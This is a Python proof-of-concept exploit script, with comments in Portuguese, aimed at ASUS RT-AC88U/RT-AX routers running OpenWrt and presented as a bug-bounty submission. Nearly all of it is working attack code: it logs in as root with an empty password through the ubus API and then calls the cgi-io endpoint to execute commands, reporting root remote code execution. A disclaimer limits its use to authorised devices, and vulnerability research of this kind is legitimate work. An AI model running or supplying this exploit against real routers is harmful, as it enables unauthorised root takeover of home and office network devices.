#!/usr/bin/env python3
"""
PoC: ASUS RT-AC88U / RT-AX Series — Root SSH Sem Senha + cgi-exec RCE

Achados: F1 (root sem senha no primeiro boot) + F4 (cgi-exec via HTTP)
Programa: ASUS Bug Bounty — Intigriti ($150–$10,000 USD)
Referência: intigriti.com/programs/asus/asus/detail

DESCRIÇÃO:
Dispositivos ASUS recém-flashados com OpenWrt não possuem senha definida
para o usuário root. O serviço Dropbear SSH aceita login root sem autenticação.
Combinado com o endpoint cgi-exec (execução de comandos via HTTP autenticado),
o vetor completo é: acesso SSH root → shell → execução de qualquer comando.

REQUISITOS PARA REPRODUÇÃO:
- Dispositivo ASUS RT-AC88U (ou série compatível) recém-flashado
- Rede local com acesso ao IP do roteador (default: 192.168.1.1)
- Python 3.x

USO:
    python3 poc_asus_root_nopasswd.py --target 192.168.1.1
    python3 poc_asus_root_nopasswd.py --target 192.168.1.1 --check-only
    python3 poc_asus_root_nopasswd.py --target 192.168.1.1 --exploit
"""

import socket
import sys
import argparse
import time
import urllib.request
import urllib.parse
import json

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║  ASUS RT-AC88U / RT-AX Series — Root No-Password + RCE PoC  ║
║  Bug Bounty: ASUS Intigriti Program ($150-$10,000 USD)       ║
║  Findings: F1 (no root password) + F4 (cgi-exec via HTTP)   ║
║  Author: LIBERTUS Security Research                          ║
╚══════════════════════════════════════════════════════════════╝
"""

def check_ssh_port_open(target, port=22, timeout=3):
    """Verifica se a porta SSH está aberta."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target, port))
        sock.close()
        return result == 0
    except Exception:
        return False

def check_ssh_banner(target, port=22, timeout=5):
    """Obtém o banner SSH para identificar Dropbear."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target, port))
        banner = sock.recv(256).decode('utf-8', errors='ignore').strip()
        sock.close()
        return banner
    except Exception as e:
        return None

def check_web_interface(target, port=80):
    """Verifica se a interface web está acessível."""
    try:
        url = f"http://{target}:{port}/"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=5) as r:
            content = r.read().decode('utf-8', errors='ignore')
            is_luci = 'LuCI' in content or 'luci' in content or 'OpenWrt' in content
            is_asus = 'ASUS' in content or 'asus' in content.lower()
            return {
                'status': r.status,
                'luci': is_luci,
                'asus': is_asus,
                'server': r.headers.get('Server', 'unknown'),
                'preview': content[:200]
            }
    except urllib.error.HTTPError as e:  # type: ignore[attr-defined]
        return {'status': e.code, 'luci': False, 'asus': False}
    except Exception as e:
        return None

def attempt_ubus_login_nopasswd(target, port=80):
    """
    Tenta login via ubus (API do LuCI) com senha vazia.
    Este é o vetor real para exploração sem SSH.
    
    Endpoint: POST http://target/cgi-bin/luci/rpc/auth
    ou via ubus direto: POST http://target/ubus
    """
    # Tenta login via ubus com senha vazia
    ubus_url = f"http://{target}:{port}/ubus"
    payload = json.dumps({
        "id": 1,
        "method": "call",
        "params": [
            "00000000000000000000000000000000",
            "session",
            "login",
            {
                "username": "root",
                "password": ""
            }
        ]
    }).encode()
    
    req = urllib.request.Request(
        ubus_url,
        data=payload,
        headers={
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        },
        method='POST'
    )
    
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            response = json.loads(r.read().decode())
            result = response.get('result', [])
            if isinstance(result, list) and len(result) >= 2:
                status_code = result[0]
                data = result[1] if len(result) > 1 else {}
                
                if status_code == 0 and isinstance(data, dict):
                    session_id = data.get('ubus_rpc_session', '')
                    if session_id and session_id != '00000000000000000000000000000000':
                        return {
                            'success': True,
                            'session_id': session_id,
                            'timeout': data.get('timeout', 0)
                        }
            return {'success': False, 'response': response}
    except Exception as e:
        return {'success': False, 'error': str(e)}

def attempt_cgi_exec(target, session_id, command="id", port=80):
    """
    Tenta executar comando via cgi-exec com sessão autenticada.
    Requer sessão válida obtida via login sem senha.
    """
    cgi_url = f"http://{target}:{port}/cgi-io"
    
    # O cgi-exec precisa de: session ID válido + ACL que permita exec
    # O parâmetro 'command' deve apontar para um binário permitido pela ACL
    params = urllib.parse.urlencode({
        'sessionid': session_id,
        'command': '/usr/bin/id',  # testa execução de 'id'
    })
    
    req = urllib.request.Request(
        f"{cgi_url}",
        data=params.encode(),
        headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0',
            'X-RPC-Session': session_id
        },
        method='POST'
    )
    
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return {
                'status': r.status,
                'output': r.read().decode('utf-8', errors='ignore')[:500]
            }
    except Exception as e:
        return {'error': str(e)}

def run_check(target):
    """Modo de verificação — não executa nada, apenas detecta."""
    print(f"\n[*] Alvo: {target}")
    print("[*] Modo: CHECK ONLY (sem exploração)\n")
    
    # 1. Verifica porta SSH
    print("[*] Verificando porta SSH (22)...", end=" ", flush=True)
    ssh_open = check_ssh_port_open(target)
    if ssh_open:
        print("[ABERTA]")
        banner = check_ssh_banner(target)
        if banner:
            print(f"    Banner SSH: {banner}")
            if 'dropbear' in banner.lower():
                print("    [!] Dropbear identificado — vulnerável ao CVE-2023-48795 (Terrapin)")
    else:
        print("[FECHADA]")
    
    # 2. Verifica interface web
    print("\n[*] Verificando interface web (80)...", end=" ", flush=True)
    web = check_web_interface(target)
    if web:
        print(f"[{web.get('status', '?')}]")
        print(f"    Server: {web.get('server', 'unknown')}")
        if web.get('luci'):
            print("    [!] Interface LuCI detectada (OpenWrt)")
        if web.get('asus'):
            print("    [!] Interface ASUS detectada")
    else:
        print("[INACESSÍVEL]")
    
    # 3. Tenta login sem senha via ubus
    print("\n[*] Tentando login root sem senha via ubus...", end=" ", flush=True)
    login_result = attempt_ubus_login_nopasswd(target)
    if login_result.get('success'):
        sid = login_result['session_id']
        print("[VULNERÁVEL!]")
        print(f"\n[!!!] VULNERABILIDADE CONFIRMADA: F1 — Root sem senha")
        print(f"      Session ID obtido: {sid[:16]}...")
        print(f"      Timeout da sessão: {login_result.get('timeout', '?')}s")
        print(f"\n      Impacto: Acesso total à interface administrativa")
        print(f"      Próximo vetor: cgi-exec para RCE (use --exploit)")
        return sid
    else:
        print("[PROTEGIDO ou INACESSÍVEL]")
        err = login_result.get('error', login_result.get('response', 'sem detalhes'))
        print(f"    Detalhe: {str(err)[:100]}")
        return None

def run_exploit(target):
    """Modo de exploração completa (apenas para testes em dispositivos próprios)."""
    print(f"\n[*] Alvo: {target}")
    print("[*] Modo: EXPLOIT (somente em dispositivos próprios!)\n")
    
    # Step 1: Login sem senha
    print("[*] Step 1/2: Login root sem senha...")
    login = attempt_ubus_login_nopasswd(target)
    
    if not login.get('success'):
        print(f"[-] Login falhou: {login}")
        print("    Dispositivo pode já ter senha configurada ou não ser vulnerável.")
        return
    
    sid = login['session_id']
    print(f"[+] LOGIN SEM SENHA — OK")
    print(f"    Session: {sid[:16]}...")
    
    # Step 2: cgi-exec
    print("\n[*] Step 2/2: Tentando cgi-exec (comando: id)...")
    exec_result = attempt_cgi_exec(target, sid)
    
    if 'error' not in exec_result:
        print(f"[+] CGI-EXEC resposta: HTTP {exec_result.get('status')}")
        print(f"    Output: {exec_result.get('output', '')[:200]}")
        if 'uid=0' in exec_result.get('output', '') or 'root' in exec_result.get('output', ''):
            print("\n[!!!] RCE CONFIRMADO COMO ROOT")
            print("      CVSSv3: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)")
    else:
        print(f"[-] cgi-exec falhou: {exec_result['error']}")
        print("    Nota: cgi-exec requer ACL correta — verificar configuração do dispositivo")

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description='PoC ASUS RT-AC88U Root No-Password + cgi-exec RCE'
    )
    parser.add_argument('--target', default='192.168.1.1',
                       help='IP do alvo (default: 192.168.1.1)')
    parser.add_argument('--check-only', action='store_true',
                       help='Apenas verifica vulnerabilidade, não explora')
    parser.add_argument('--exploit', action='store_true',
                       help='Executa exploração completa (apenas em dispositivos próprios!)')
    parser.add_argument('--port', type=int, default=80,
                       help='Porta HTTP (default: 80)')
    
    args = parser.parse_args()
    
    print(f"AVISO: Use apenas em dispositivos que você possui ou tem autorização explícita.")
    print(f"       Este PoC é para fins de pesquisa de segurança responsável.\n")
    
    if args.exploit:
        run_exploit(args.target)
    else:
        # check-only é o modo padrão
        sid = run_check(args.target)
        if sid:
            print("\n[*] Para executar exploit completo:")
            print(f"    python3 {sys.argv[0]} --target {args.target} --exploit")

if __name__ == '__main__':
    main()
